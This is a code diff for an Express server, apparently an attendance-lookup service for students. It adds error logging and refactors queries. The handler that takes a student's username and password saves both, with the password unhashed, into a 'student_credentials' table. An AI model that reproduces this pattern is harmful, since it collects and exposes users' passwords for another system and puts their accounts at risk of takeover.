@@ -50,19 +50,23 @@ app.post("/get-attendance", async (req, res) => {
 
     const now = new Date().toISOString();
 
-    // Save credentials
-    await supabase.from("student_credentials")
+    // --- Save credentials and visit to Supabase ---
+    const { error: credError } = await supabase
+      .from("student_credentials")
       .upsert([{ username, password, fetched_at: now }], { onConflict: ["username"] });
+    if (credError) console.error("Supabase insert error:", credError);
 
-    // Record site visit
-    await supabase.from("site_visits")
+    // --- Record site visit for daily count ---
+    const { error: visitError } = await supabase
+      .from("site_visits")
       .insert([{ username, visited_at: now }]);
+    if (visitError) console.error("Supabase visit insert error:", visitError);
 
   } catch (err) {
     console.error(err);
     res.status(500).json({ success: false, error: err.message });
   } finally {
-    if (page) await page.close(); // only close this tab, keep blank alive
+    if (page) await page.close();
   }
 });
 
@@ -76,14 +80,15 @@ app.get("/today-logins", async (req, res) => {
 
     const { count, error } = await supabase
       .from("site_visits")
-      .select("id", { count: "exact", head: true })
-      .gte("visited_at", startOfDay.toISOString())
-      .lte("visited_at", endOfDay.toISOString());
+      .select('id', { count: 'exact', head: true }) // head:true avoids fetching rows
+      .gte('visited_at', startOfDay.toISOString())
+      .lte('visited_at', endOfDay.toISOString());
 
-    if (error) throw error;
-    res.json({ today_logins: count });
-  } catch (err) {
-    console.error(err);
+    if(error) throw error;
+
+    res.json({ today_logins: count || 0 });
+  } catch(err) {
+    console.error("Error fetching today-logins:", err);
     res.status(500).json({ today_logins: 0 });
   }
 });
